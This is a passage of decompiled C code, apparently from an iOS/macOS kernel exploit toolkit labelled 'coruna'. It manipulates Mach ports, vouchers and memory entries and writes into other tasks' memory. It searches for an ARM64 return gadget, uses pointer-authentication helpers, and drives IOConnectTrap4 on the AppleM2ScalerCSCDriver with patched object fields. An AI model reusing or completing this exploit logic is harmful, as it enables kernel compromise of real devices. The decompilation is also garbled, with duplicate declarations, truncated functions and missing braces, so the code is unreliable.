                if (err == 0) {
                  handle[0x22] = (long)"__TEXT_EXEC";
                }
                addr = *(long *)(flags + 0xc);
                handle = *(long *)(flags + 10);
                *ptr = (long)handle;
                ptr[2] = addr;
                ptr[1] = handle;
                addr = *(long *)(flags + 8);
                handle = *(long *)(flags + 6);
                ptr[3] = (long)handle;
                ptr[5] = addr;
                ptr[4] = handle;
                ptr[6] = (long)flags;
                ptr = ptr + 7;
              }
              flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
            } while (flags < status);
            handle = *(long *)handle[0x1a];
          }
          addr = NEON_rev64(*(uint64_t *)(handle + 4),4);
          handle[5] = addr;
          *(uint32_t *)(handle + 6) = *(uint32_t *)(handle + 0x18);
          kind = (uint)val;
          if ((kind >> 8 & 1) != 0) {
            coruna_macho_map_segsect(scratch,handle,"__TEXT","__thread_starts");
            if (bootargs != 0) {
              *(uint8_t *)((long)handle + 0x9c) = 1;
            }
            if ((((kind >> 10 & 1) != 0) && (*handle != 0)) &&
               (handle = *(long *)(*handle + 8), handle != 0)) {
              handle[0x14] = arg - handle;
            }
          }
          if ((kind >> 6 & 1) == 0) {
            flags = (int *)(*(long *)handle[0x1a] + 0x20);
            status = (int *)((long)flags + (unsigned long)*(uint *)(*(long *)handle[0x1a] + 0x14));
            if (flags < status) {
              type_id = 0;
              err = false;
              version = (long)(int)handle[7] - 1;
              type_id_9 = arg;
              do {
                port = type_id_9;
                if (*flags == 0x19) {
                  err = flags + 2;
                  err = _strcmp((char *)err,"__TEXT");
                  if (err == 0) {
                    handle[0x1f] = arg - *(long *)(flags + 6);
                  }
                  if (((kind >> 8 & 1) != 0) &&
                     (err = _strcmp((char *)err,"__KLD"), err == 0)) {
                    err = true;
                  }
                  type_id_8 = type_id;
                  if ((((kind & 0x580) != 0x180) && (*(long *)(flags + 8) != 0)) &&
                     (type_id_8 = *(long *)(flags + 6) + *(long *)(flags + 8), type_id_8 <= type_id)) {
                    type_id_8 = type_id;
                  }
                  if ((((kind >> 10 & 1) != 0) && (*(long *)(flags + 8) != 0)) &&
                     (port = *(unsigned long *)(flags + 6), type_id_9 <= port || port == 0)) {
                    port = type_id_9;
                  }
                  err = _strcmp((char *)err,"__LINKEDIT");
                  type_id = type_id_8;
                  if (err == 0) {
                    lpau1 = (uint8_t (*) [16])(flags + 8);
                    version = NEON_ext(*lpau1,*lpau1,8,1);
                    type_id = *(long *)*lpau1 + *(long *)(flags + 6);
                    if ((kind & 0x580) != 0x180) {
                      type_id = type_id_8;
                    }
                    handle[2] = *(long *)(flags + 6);
                    handle[4] = version;
                    handle[3] = version;
                  }
                }
                flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
                type_id_9 = port;
              } while (flags < status);
              if ((((uint)!err & kind >> 8) == 0) && (type_id != 0)) {
                if ((((kind ^ 0xffffffff) & 0x500) == 0) && (handle[0x14] != 0)) {
                  port = handle[0x14];
                }
                if (port != arg) {
                  arg = port & (version ^ 0xffffffffffffffff);
                }
                type_id = type_id + version & (version ^ 0xffffffffffffffff);
                if (arg <= type_id) {
                  handle[0x1c] = arg;
                  handle[0x1d] = type_id - arg;
                  coruna_vm_deallocate_12c8c(handle,val);
                }
              }
            }
          }
        }
      }
    }
  }
  return;
}
void coruna_call_find_text_exec(void)
{
  coruna_find_text_exec();
  return;
}
void coruna_kernel5_via_vm_deallocate_12c18(uint64_t *val)
{
  uint64_t *ptr;
  
  coruna_vm_deallocate_12c18();
  ptr = (uint64_t *)val[0x1a];
  if (ptr != (uint64_t *)0x0) {
    if ((void *)*ptr != (void *)0x0) {
      _free((void *)*ptr);
      ptr = (uint64_t *)val[0x1a];
      *ptr = 0;
    }
    _free(ptr);
    val[0x1a] = 0;
  }
  if ((void *)*val != (void *)0x0) {
    _free((void *)*val);
    *val = 0;
  }
  if ((void *)val[0x21] != (void *)0x0) {
    _free((void *)val[0x21]);
    val[0x21] = 0;
  }
  return;
}
void coruna_vm_read_overwrite(uint64_t val)
{
  unsigned long *address;
  int err;
  kern_return_t lk2;
  vm_map_t target_task;
  vm_size_t scratch;
  unsigned long bootargs;
  long thread_attr;
  
  err = coruna_task_info(val,&thread_attr);
  if (err == 0) {
    address = (unsigned long *)(thread_attr + 0x28);
    target_task = (vm_map_t)val;
    if (*(vm_map_t *)k_kernel_mach_task_self_slot == target_task) {
      *address = *address | 1;
    }
    else {
      lk2 = _vm_read_overwrite(target_task,(vm_address_t)address,8,(vm_address_t)&bootargs,
                                 &scratch);
      if (lk2 == 0) {
        bootargs = bootargs | 1;
        _vm_write(target_task,(vm_address_t)address,(vm_offset_t)&bootargs,8);
      }
    }
  }
  return;
}
void coruna_task_info(task_name_t arg,long *handle)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  long bootargs [3];
  
  scratch = 5;
  lk1 = _task_info(arg,0x11,(task_info_t)bootargs,&scratch);
  if ((lk1 == 0) && (bootargs[0] != 0)) {
    *handle = bootargs[0];
  }
  return;
}
void coruna_kernel5_via_task_info(uint64_t val,uint64_t id_2)
{
  int err;
  uint8_t scratch[8];
  
  err = coruna_kernel5_residual_228(id_2);
  if (-1 < err) {
    coruna_task_info(*(uint32_t *)k_kernel_mach_task_self_slot,scratch);
  }
  return;
}
void coruna_kernel5_residual_228(int flags)
{
  if (flags < 0x12) {
    if (flags < 4) {
      if (flags < 2) {
        if (flags == 0) {
          return;
        }
        if (flags == 1) {
          return;
        }
      }
      else {
        if (flags == 2) {
          return;
        }
        if (flags == 3) {
          return;
        }
      }
    }
    else if (flags < 0x10) {
      if (flags == 4) {
        return;
      }
      if (flags == 5) {
        return;
      }
    }
    else {
      if (flags == 0x10) {
        return;
      }
      if (flags == 0x11) {
        return;
      }
    }
  }
  else if (flags < 0x16) {
    if (flags - 0x13U < 2) {
      return;
    }
    if (flags == 0x12) {
      return;
    }
    if (flags == 0x15) {
      return;
    }
  }
  else {
    if (flags - 0x17U < 2) {
      return;
    }
    if (flags == 0x19) {
      return;
    }
    if (flags == 0x16) {
      return;
    }
  }
  return;
}
void coruna_mach_port_mod_refs(long handle,unsigned long arg,mach_port_name_t *arg_x)
{
  kern_return_t lk1;
  int err;
  mach_port_name_t *lpm3;
  uint64_t u;
  long scratch;
  mach_port_name_t bootargs;
  
  bootargs = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    err = coruna_host_create_mach_voucher(handle,(arg & 0xffffffff) + 0x1122334455667788,&bootargs);
    if (err == 0) {
      return;
    }
  }
  else {
    lpm3 = (mach_port_name_t *)coruna_kernel5_via_task_info(handle,arg);
    if (lpm3 == (mach_port_name_t *)0x0) {
      return;
    }
    bootargs = *lpm3;
    if (bootargs + 1 < 2) {
      scratch = 0;
      if ((int)arg - 0x13U < 2) {
        u = 0xc;
      }
      else {
        if ((int)arg != 0x10) {
          return;
        }
        u = 0xb;
      }
      err = coruna_kernel5_via_kernel5_via_vm_deallocate_2a1cc(handle,u,&scratch);
      if (err == 0) {
        return;
      }
      if (scratch == 0) {
        return;
      }
      err = coruna_mach_port_request_notification(handle,scratch,&bootargs);
      if (err != 0) {
        return;
      }
      if (bootargs + 1 < 2) {
        return;
      }
      lk1 = _mach_port_mod_refs(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs,0,0xffff);
      if (lk1 != 0) {
        return;
      }
      *lpm3 = bootargs;
    }
    lk1 = _mach_port_mod_refs(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs,0,1);
    if (lk1 != 0) {
      return;
    }
  }
  *arg_x = bootargs;
  return;
}
void coruna_mach_port_deallocate_139b0(uint64_t val,uint64_t id_2,vm_size_t arg,vm_address_t *arg_x)
{
  uint u;
  uint size;
  vm_inherit_t unaff_w22;
  mem_entry_name_port_t scratch;
  
  scratch = 0;
  u = coruna_mach_port_mod_refs(val,id_2,&scratch);
  if (u == 0) {
    if (1 < scratch + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,scratch);
    }
    return;
  }
  if (((u != 0) && (arg_x != (vm_address_t *)0x0)) && (*arg_x != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*arg_x,arg);
    *arg_x = 0;
  }
fail:
  if (1 < scratch + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,scratch);
  }
  return;
}
void coruna_kernel5_via_mach_port_deallocate_139b0(long handle)
{
  int err;
  uint64_t u;
  uint64_t scratch;
  
  scratch = 0;
  u = *(uint64_t *)k_kernel_vm_page_size_slot;
  if (((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) &&
     (err = coruna_mach_port_deallocate_139b0(handle,0x10,u,&scratch), err == 0)) {
    *(uint64_t *)(handle + 0x118) = scratch;
    *(uint64_t *)(handle + 0x120) = u;
  }
  return;
}
void coruna_mach_port_deallocate_13b50(uint *size,uint32_t *size_x)
{
  uint8_t *ptr;
  int err;
  uint u;
  unsigned long size;
  uint32_t version;
  uint *buf;
  long handle;
  mach_port_name_t *lpm8;
  uint64_t port;
  long addr;
  long off;
  stat scratch;
  uint32_t bootargs;
  uint thread_attr [2];
  uint64_t host_info;
  mach_port_name_t serial_buf [4];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf[0] = 0;
  serial_buf[1] = 0;
  serial_buf[2] = 0;
  serial_buf[3] = 0;
  thread_attr[0] = 0xffffffff;
  thread_attr[1] = 0xffffffff;
  host_info = 0xffffffffffffffff;
  bootargs = 0xffffffff;
  if ((*(unsigned long *)(size + 0x56) < 0x1c1b0a80100000) || ((*size & 0x5584001) == 0)) {
    addr = 3;
    if (*(unsigned long *)(size + 0x56) < 0x1f530000000000) {
      addr = 4;
    }
  }
  else {
    addr = 3;
  }
  err = coruna_open_dev_null(&bootargs);
  ptr = k_kernel_mach_task_self_slot;
  if (err == 0) {
    handle = 0x1122334455667788;
    lpm8 = serial_buf;
    buf = thread_attr;
    off = addr;
    do {
      err = coruna_host_create_mach_voucher(size,handle,lpm8);
      if (err != 1) goto fail;
      u = coruna_fileport_makefd(*lpm8);
      *buf = u;
      _mach_port_deallocate(*(ipc_space_t *)ptr,*lpm8);
      *lpm8 = 0;
      if ((int)*buf < 0) goto fail;
      handle = handle + 1;
      lpm8 = lpm8 + 1;
      buf = buf + 1;
      off = off + -1;
    } while (off != 0);
    err = coruna_kernel5_via_fcntl(thread_attr);
    if (err == 0) {
      size[0x64c] = thread_attr[0];
      size[0x64d] = thread_attr[1];
      if ((*(unsigned long *)(size + 0x56) < 0x1c1b0a80100000) ||
         (((*size & 0x5584001) == 0 && (*(unsigned long *)(size + 0x56) < 0x1f530000000000)))) {
        *(uint64_t *)(size + 0x64e) = host_info;
      }
      else {
        size[0x650] = (uint)host_info;
      }
      err = _fstat(thread_attr[1],&scratch);
      if (err == 0) {
        addr = coruna_fn_ptr_cast_2(size,scratch.st_atimespec.tv_sec);
        if (addr != 0) {
          *(__darwin_time_t *)(size + 0x674) = scratch.st_atimespec.tv_sec;
        }
        if ((*(unsigned long *)(size + 0x56) < 0x1c1b0a80100000) ||
           (((*size & 0x5584001) == 0 && (*(unsigned long *)(size + 0x56) < 0x1f530000000000)))) {
          if ((scratch.st_atimespec.tv_nsec != 0) &&
             ((*(unsigned long *)(size + 0x62) & scratch.st_atimespec.tv_nsec) == 0)) {
            *(long *)(size + 0x678) = scratch.st_atimespec.tv_nsec;
          }
        }
        else {
          size = scratch.st_atimespec.tv_nsec | 0xffffff0000000000;
          addr = coruna_fn_ptr_cast_2(size,size);
          if (addr != 0) {
            *(unsigned long *)(size + 0x86) = size;
          }
          size = ((unsigned long)scratch.st_atimespec.tv_nsec >> 0x28) * (unsigned long)size[0x60];
          if ((size != 0) && ((*(unsigned long *)(size + 0x62) & size) == 0)) {
            *(unsigned long *)(size + 0x678) = size;
          }
          if ((((size[0x64c] != 0xffffffff) && (size[0x64d] != 0xffffffff)) &&
              (size[0x650] != 0xffffffff)) &&
             (((*(long *)(size + 0x86) != 0 && (0x1c1b19145fffff < *(unsigned long *)(size + 0x56)))
              && (err = coruna_kernel5_via_mach_port_deallocate_139b0(size), err == 0)))) {
            port = *(uint64_t *)(*(long *)(size + 0x46) + 0x100);
            addr = coruna_fn_ptr_cast_2(size,port);
            if (addr != 0) {
              *(uint64_t *)(size + 0x88) = port;
            }
          }
        }
      }
      coruna_kernel5_residual_236(size + 0x64c);
      size = coruna_close(bootargs);
      version = 1;
      *size_x = version;
      if (*(long *)k_kernel_stack_chk_guard_slot != action) {
      ___stack_chk_fail(size);
      }
      return;
void coruna_mach_port_deallocate_13e94(long handle,uint32_t *size)
{
  long *ptr;
  mach_port_name_t name;
  uint8_t *ptr;
  bool err;
  int err;
  uint u;
  kern_return_t lk6;
  unsigned long size;
  mach_port_name_t *lpm8;
  unsigned long size;
  uint32_t version;
  mach_port_name_t *lpm10;
  uint64_t port;
  long handle;
  vm_inherit_t in_stack_ffffffffffffff70;
  uint32_t scratch;
  uint64_t *bootargs;
  vm_address_t thread_attr [3];
  mem_entry_name_port_t host_info [4];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  host_info[2] = 0;
  host_info[0] = 0;
  host_info[1] = 0;
  thread_attr[0] = 0;
  size = *(unsigned long *)k_kernel_vm_page_size_slot;
  bootargs = (uint64_t *)0x0;
  scratch = 0xffffffff;
  err = coruna_open_dev_null(&scratch);
  ptr = k_kernel_mach_task_self_slot;
  size = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
  return;
  }
  ___stack_chk_fail(size);
}
void coruna_mach_port_deallocate_141e8(long handle,mach_port_name_t *arg,uint64_t val)
{
  int err;
  kern_return_t lk2;
  long handle;
  long addr;
  long off;
  uint scratch;
  uint8_t bootargs[4];
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  off = 0x38;
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return;
    }
  }
  else if (1 < err - 0x1f53U) {
    if (err != 0x2258) {
      return;
    }
    off = 0x30;
  }
  handle = coruna_ret_stub_8(handle,*arg);
  if ((((handle != 0) && (err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state(handle,handle,&scratch), err != 0)) &&
      ((scratch & 0x3ff) == 0x25)) && (addr = coruna_kernel5_via_pacia_5(handle,handle), addr != 0)) {
    err = coruna_kernel5_residual_257(handle,addr + off,&thread_attr);
    if ((err != 0) && (handle == thread_attr)) {
      err = coruna_kernel5_via_kernel5_via_kernel5_via_thread_get_state(handle,addr + 8,bootargs);
      if ((err != 0) &&
         ((err = coruna_mach_vm_machine_attribute(handle,addr + 8,0xffff), err != 0 &&
          (lk2 = _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,*arg),
          lk2 == 0)))) {
        *arg = 0;
        handle = coruna_ret_stub_8(handle,val);
        if ((handle != 0) && (err = coruna_call_mach_vm_machine_attribute_1d4f8(handle,addr + off,handle), err != 0)) {
          coruna_kernel5_via_kernel5_via_pacia_7_2(handle,handle);
        }
      }
    }
  }
  return;
}
void coruna_mach_port_deallocate_14398(long handle,unsigned long arg,uint64_t val)
{
  int err;
  kern_return_t lk2;
  mach_port_name_t *lpm3;
  long handle;
  uint64_t u;
  long scratch;
  mach_port_name_t bootargs;
  
  bootargs = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    err = coruna_host_create_mach_voucher(handle,(arg & 0xffffffff) + 0x1122334455667788,&bootargs);
    if (err != 0) {
      coruna_mach_port_deallocate_141e8(handle,&bootargs,val);
    }
    if (1 < bootargs + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
    }
    return;
  }
  scratch = 0;
  lpm3 = (mach_port_name_t *)coruna_kernel5_via_task_info(handle,arg);
  if (((lpm3 == (mach_port_name_t *)0x0) || (handle = coruna_call_helper_25fa0(handle,val), handle == 0))
     if (1 < bootargs + 1) {
     _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
     }
     return;
}
unsigned long coruna_mach_make_memory_entry(uint64_t arg,uint64_t val,size_t n,vm_offset_t m,
                  vm_address_t *p)
{
  uint8_t *data;
  bool err;
  uint u;
  unsigned long size;
  vm_inherit_t in_stack_ffffffffffffff90;
  size_t cache_21;
  mem_entry_name_port_t cache_34;
  vm_offset_t scratch;
  
  data = k_kernel_mach_task_self_slot;
  cache_34 = 0;
  err = m == 0;
  cache_21 = n;
  scratch = m;
  if ((m == 0) &&
     (u = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,n,1),
     u != 0)) {
    err = false;
    size = (unsigned long)(u | 0x80000000);
    if (1 < cache_34 + 1) {
    _mach_port_deallocate(*(ipc_space_t *)data,cache_34);
    }
    if (err) {
    _vm_deallocate(*(vm_map_t *)data,scratch,n);
    }
    return size;
  }
  u = _mach_make_memory_entry(*(vm_map_t *)data,&cache_21,scratch,3,&cache_34,0);
  if (u != 0) {
    size = (unsigned long)(u | 0x80000000);
  }
  else if (cache_21 == n) {
      size = coruna_mach_port_deallocate_14118(arg,val,cache_34);
      if (((int)size == 0) && (m == 0)) {
        u = _vm_map(*(vm_map_t *)data,p,n,0,1,cache_34,0,0,3,2,
                        in_stack_ffffffffffffff90);
        if (u == 0) {
          _bzero((void *)*p,n);
          size = 0;
          if (1 < cache_34 + 1) {
          _mach_port_deallocate(*(ipc_space_t *)data,cache_34);
          }
          if (err) {
          _vm_deallocate(*(vm_map_t *)data,scratch,n);
          }
          return size;
        }
        size = (unsigned long)(u | 0x80000000);
      }
  }
  else {
      size = 0xad022;
  }
  if (((int)size != 0 && m == 0) && (*p != 0)) {
    _vm_deallocate(*(vm_map_t *)data,*p,n);
  }
  if (1 < cache_34 + 1) {
    _mach_port_deallocate(*(ipc_space_t *)data,cache_34);
  }
  if (err) {
    _vm_deallocate(*(vm_map_t *)data,scratch,n);
  }
  return size;
}
void coruna_kernel09_via_mach_make_memory_entry(long handle)
{
  uint8_t *ptr;
  int err;
  uint64_t u;
  uint64_t scratch;
  
  ptr = k_kernel_vm_page_size_slot;
  scratch = 0;
  err = coruna_mach_make_memory_entry((int)handle,0x10,*(uint64_t *)k_kernel_vm_page_size_slot,0,&scratch);
  if (err == 0) {
    u = *(uint64_t *)ptr;
    *(uint64_t *)(handle + 0x118) = scratch;
    *(uint64_t *)(handle + 0x120) = u;
  }
  return;
}
void coruna_mach_port_deallocate_1476c(uint *size)
{
  uint8_t *ptr;
  int err;
  uint64_t u;
  long handle;
  unsigned long size;
  uint version;
  long addr;
  long off;
  long base;
  long scratch;
  mach_port_name_t bootargs;
  uint thread_attr;
  uint host_info [4];
  uint32_t serial_buf[4];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  off = 0x1122334455667788;
  u = coruna_host_create_mach_voucher(size,0x1122334455667788,serial_buf);
  if ((((int)u != 0) && (handle = coruna_call_helper_25fa0(size,serial_buf[0]), u = 0, handle != 0)) &&
     (u = coruna_kernel5_via_mach_vm_read_overwrite(size,handle,&thread_attr), ptr = k_kernel_mach_task_self_slot,
     (int)u != 0)) {
    if ((thread_attr & 0x3ff) != 0x22) {
      u = 0;
      host_info[0] = size[0x64c];
      host_info[1] = size[0x64d];
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(u);
void coruna_mach_make_memory_entry_14a20(long handle)
{
  uint8_t *ptr;
  kern_return_t lk2;
  uint u;
  int err;
  mach_port_name_t *lpm5;
  unsigned long size;
  mach_port_name_t *lpm7;
  long handle;
  size_t size;
  long addr;
  vm_inherit_t in_stack_ffffffffffffff60;
  mach_port_name_t lm10;
  mem_entry_name_port_t scratch;
  uint64_t *bootargs;
  size_t thread_attr;
  uint host_info;
  mach_port_name_t serial_buf [5];
  mem_entry_name_port_t action;
  long block_ctx;
  
  block_ctx = *(long *)k_kernel_stack_chk_guard_slot;
  size = *(size_t *)k_kernel_vm_page_size_slot;
  bootargs = (uint64_t *)0x0;
  thread_attr = size;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    serial_buf[3] = 0;
    size = coruna_host_create_mach_voucher(handle,0x3122334455667788,serial_buf + 3);
    lm10 = serial_buf[3];
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  else {
    lpm5 = (mach_port_name_t *)coruna_kernel5_via_task_info(handle,0);
    size = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  serial_buf[0] = lm10;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    addr = coruna_call_helper_25fa0(handle);
    size = 0;
    if ((addr == 0) || (size = coruna_kernel5_via_mach_vm_read_overwrite(handle,addr,&host_info), (int)size == 0))
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  else if (lm10 + 1 < 2) {
done:
    ptr = k_kernel_mach_task_self_slot;
    err = *(int *)(handle + 0xe8);
    if (((((err + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
         (*(long *)(handle + 0x100) == 0)) ||
        ((lm10 = *(mach_port_name_t *)(handle + 0x114), lm10 + 1 < 2 ||
         (serial_buf[3] = lm10, serial_buf[4] = err, *(long *)(&k_kernel_slot_19d0 + handle) == 0)))) ||
       (*(long *)(handle + 0xf0) == 0)) {
cleanup:
      size = 0;
    }
    else {
      lk2 = _mach_make_memory_entry
                        (*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,0,0x20003,&scratch,0
                        );
      size = 0;
      if (lk2 == 0) {
        action = scratch;
        lk2 = _vm_map(*(vm_map_t *)ptr,(vm_address_t *)&bootargs,size,0,1,scratch,0,0,3,2,
                        in_stack_ffffffffffffff60);
        size = 0;
        if (lk2 == 0) {
          _bzero(bootargs,size);
          *bootargs = *(uint64_t *)(&k_kernel_slot_19d0 + handle);
          bootargs[1] = *(uint64_t *)(handle + 0xf0);
          *(int *)(bootargs + 2) = (int)*(uint64_t *)(handle + 0x108);
          *(uint32_t *)((long)bootargs + 0x14) = *(uint32_t *)(handle + 0x110);
          u = _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)bootargs,size);
          size = (unsigned long)u;
          addr = 0;
          lpm5 = serial_buf;
          do {
            if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
              lm10 = 0;
              size = coruna_host_create_mach_voucher(handle,addr + 0x3122334455667788,&ghidra_stack_1);
              if ((int)size == 0) break;
              *lpm5 = lm10;
              size = coruna_mach_port_deallocate_141e8(handle,lpm5,serial_buf[addr + 3]);
              if ((int)size == 0) break;
            }
            else {
              lpm7 = (mach_port_name_t *)coruna_kernel5_via_task_info(size,addr);
              size = 0;
              if (lpm7 == (mach_port_name_t *)0x0) break;
              lm10 = serial_buf[addr + 3];
              handle = coruna_call_helper_25fa0(handle,lm10);
              size = 0;
              if (handle == 0) break;
              err = coruna_kernel5_via_kernel5_via_call_mach_vm_machine_attribute_1d4f8_2667c_8(handle,handle);
              if ((err != 0) ||
                 (lk2 = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm10,0,0xffff), lk2 != 0))
              goto cleanup;
              *lpm7 = lm10;
            }
            addr = addr + 1;
            lpm5 = lpm5 + 1;
            size = 1;
          } while (addr != 3);
        }
      }
    }
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
void coruna_open_m2scaler_14d30(long handle,uint64_t val,long addr_2,uint64_t id_2,uint64_t size_3
                 ,uint64_t off_4,unsigned long *arg)
{
  long handle;
  uint u;
  uint size;
  int err;
  long addr;
  uint64_t version;
  long off;
  unsigned long port;
  int scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t host_info;
  int serial_buf;
  uint64_t action;
  uint64_t bootargs;
  uint64_t block_ctx;
  long stack_guard;
  
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf = 0;
  bootargs = 0;
  u = *(uint *)(handle + 0x180);
  size = 0;
  if (u != 0) {
    size = 0x1000 / u;
  }
  err = 0x1000 - size * u;
  scratch = 0x1000;
  if (err != 0) {
    scratch = (u - err) + 0x1000;
  }
  if (*(long *)(handle + 0x200) == 0) {
    coruna_macho_text_sect(&action,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
    scratch = bootargs;
    thread_attr = action;
    host_info = block_ctx;
    addr = coruna_strsep(&action,"00 00 01 91 C0 03 5F D6",0,0);
    {
      if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
      ___stack_chk_fail();
      }
      return;
    }
    *(long *)(handle + 0x200) = addr;
  }
  version = _IOServiceMatching("AppleM2ScalerCSCDriver");
  version = _IOServiceGetMatchingService(*(uint32_t *)k_kernel_kiomasterportdefault_slot,version);
  u = (int)version + 1;
  if (((((1 < u) &&
        (err = _IOServiceOpen(version,*(uint32_t *)k_kernel_mach_task_self_slot,0,&serial_buf),
        err == 0)) && (1 < serial_buf + 1U)) &&
      ((addr = coruna_kernel5_via_kernel5_via_pacia_5(handle), addr != 0 &&
       (err = coruna_kernel5_residual_257(handle,addr,&bootargs), err != 0)))) &&
     ((off = coruna_pacia(handle,bootargs), off != 0 &&
      (off = coruna_mach_port_request_notification_29a50(handle,&scratch), off != 0)))) {
    err = coruna_ret_stub_6(handle,bootargs,0x1000,&action);
    if ((err != 0) && (err = coruna_ret_stub_7(handle,off,&action,0x1000), err != 0)) {
      handle = 0x5c0;
      if (*(int *)(handle + 0x140) < 0x1809) {
        handle = 0x5b8;
      }
      err = coruna_call_mach_vm_machine_attribute_1d4f8(handle,handle + off,*(uint64_t *)(handle + 0x200));
      if (err != 0) {
        coruna_call_mach_vm_machine_attribute_1d4f8(handle,addr,off);
        coruna_call_mach_vm_machine_attribute_1d4f8(handle,addr + 0x40,8);
        coruna_call_mach_vm_machine_attribute_1d4f8(handle,addr + 0x48,val);
        coruna_call_mach_vm_machine_attribute_1d4f8(handle,addr + 0x50,addr_2 * 2 + -0x10);
        port = _IOConnectTrap4(serial_buf,0,id_2,size_3,off_4,0);
        coruna_call_mach_vm_machine_attribute_1d4f8(handle,addr + 0x40,0);
        coruna_call_mach_vm_machine_attribute_1d4f8(handle,addr + 0x48,0);
        coruna_call_mach_vm_machine_attribute_1d4f8(handle,addr + 0x50,0);
        coruna_call_mach_vm_machine_attribute_1d4f8(handle,addr,bootargs);
        if (arg != (unsigned long *)0x0) {
          *arg = port & 0xffffffff;
        }
      }
    }
    coruna_mach_port_allocate(handle,off,scratch);
  }
  if (1 < serial_buf + 1U) {
    _IOServiceClose();
  }
  if (1 < u) {
    _IOObjectRelease(version);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_strsep(uint64_t *val,char *path,uint32_t size,uint32_t flags_2)
{
  int err;
  char *ptr;
  char *buf;
  long handle;
  uint64_t u;
  long addr;
  long off;
  char *scratch;
  uint64_t scratch;
  uint64_t bootargs;
  char *thread_attr;
  ushort host_info [128];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  thread_attr = (char *)0x0;
  u = 0;
  if ((path != (char *)0x0) && (ptr = _strdup(path), ptr != (char *)0x0)) {
    addr = 0;
    off = 0;
    scratch = ptr;
    do {
      buf = _strsep(&scratch," ");
      err = _strcmp(buf,"-");
      handle = addr;
      if (err != 0) {
        err = _strcmp(buf,"+");
        if (err != 0) {
          err = _strcmp(buf,"..");
          if (err == 0) {
            host_info[addr] = 0xffff;
            if (addr < 0x7f) {
              addr = addr + 1;
              handle = off;
            }
          }
          else {
            handle = _strtol(buf,&thread_attr,0x10);
            host_info[addr] = (ushort)handle & 0xff;
            if (*thread_attr == '\0') {
              if (addr < 0x7f) {
                addr = addr + 1;
                handle = off;
              }
            }
            else {
              _free(ptr);
              u = 0;
              if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
                ___stack_chk_fail(u);
              }
              return;
void coruna_kernel5_via_cat(long *handle,long addr_2,unsigned long arg,long off_3,int flags)
{
  unsigned long u;
  byte *ptr;
  int err;
  char err;
  ushort size;
  byte *buf;
  uint version;
  byte *str;
  byte err;
  long handle;
  char status;
  unsigned long port;
  byte *copy;
  short *lps14;
  byte *data;
  uint8_t port[16];
  long scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t stack_guard;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t sa_saved;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t sa_new;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t path_buf;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  version = (uint)arg;
  err = (char)arg;
  if (((arg == (long)err) && (handle[2] != 0)) && (handle[1] != 0)) {
    port = arg;
    if (0 < (int)version) {
      u = ((unsigned long)-version | 0xffffffff00000000) + arg;
      handle = (arg & 0xffffffff) + 1;
      do {
        version = version - 1;
        port = arg;
        if (*(short *)(addr_2 + (unsigned long)version * 2) != -1) break;
        arg = arg - 1;
